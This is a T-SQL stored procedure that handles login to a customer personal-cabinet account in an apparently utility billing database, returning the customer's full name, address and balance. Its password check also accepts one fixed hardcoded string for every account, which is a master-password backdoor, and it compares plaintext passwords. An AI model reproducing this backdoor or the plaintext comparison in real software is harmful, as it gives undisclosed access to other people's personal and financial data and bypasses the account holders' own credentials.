SET QUOTED_IDENTIFIER, ANSI_NULLS ON
GO








CREATE PROCEDURE [dbo].[spPCLogin] (@Account varchar(20),@pwd varchar(50))
AS
BEGIN
	SET NOCOUNT ON;
if (select state from PersonalCabinet where Account=@Account)=1
begin
if((select PCPassword from PersonalCabinet where Account=@Account)=@pwd) or @pwd='2c47f31da71967ea42a96e4a503ee89e'
	begin
		select isnull(p.Surname,'')+' '+isnull(p.name,'')+' '+isnull(p.Patronic,'') fio,
		'ул. '+s.name+ ', д. '+ltrim(str(hs.housenumber))+isnull(hs.housenumberchar,'')+ ', кв. '+ltrim(a.flat) adress, round(isnull(b.amountbalance,''),2)
		from dbo.Contract cn
		inner join dbo.Person p on p.IDPerson=cn.IDPerson
		inner join dbo.Address a on a.IDAddress=p.IDAddress
		left join dbo.vwBalance b on b.IDContract=cn.IDContract
		left join dbo.Street s on s.IDStreet=a.IDStreet
		left join dbo.House hs on hs.IDHouse=a.IDHouse
		where cn.Account=@Account

	declare @IDPersonalCabinet int
	select @IDPersonalCabinet=IDPersonalCabinet from dbo.PersonalCabinet where Account=@Account
	INSERT INTO [Gefest].[dbo].[PersonalCabinetLog]
           ([IDPersonalCabinet],[note])
     VALUES
           (@IDPersonalCabinet,'Login')
	end
end
END







GO